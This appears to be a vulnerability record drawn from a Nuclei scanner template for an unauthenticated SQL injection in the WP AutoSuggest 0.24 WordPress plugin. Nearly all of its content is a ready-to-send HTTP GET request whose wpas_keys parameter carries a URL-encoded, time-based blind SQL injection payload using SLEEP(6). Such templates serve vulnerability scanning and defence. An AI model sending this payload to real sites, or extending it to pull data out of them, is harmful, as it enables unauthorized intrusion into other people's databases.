# Vulnerability: WP AutoSuggest 0.24 - SQL Injection
**Classification:** CWE-89
**Source:** Nuclei Template (`wp-autosuggest-sql-injection.yaml`)

## Description
The wp-autosuggest WordPress plugin was affected by an Unauthenticated SQL Injection security vulnerability.

## Vulnerable Code Pattern / Exploit Payload
```http
@timeout: 20s
GET /wp-content/plugins/wp-autosuggest/autosuggest.php?wpas_action=query&wpas_keys=1%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F5202%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%286%29%29%29yRVR%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27dwQZ%27%2F%2A%2A%2FLIKE%2F%2A%2A%2F%27dwQZ HTTP/1.1
Host: {{Hostname}}
```

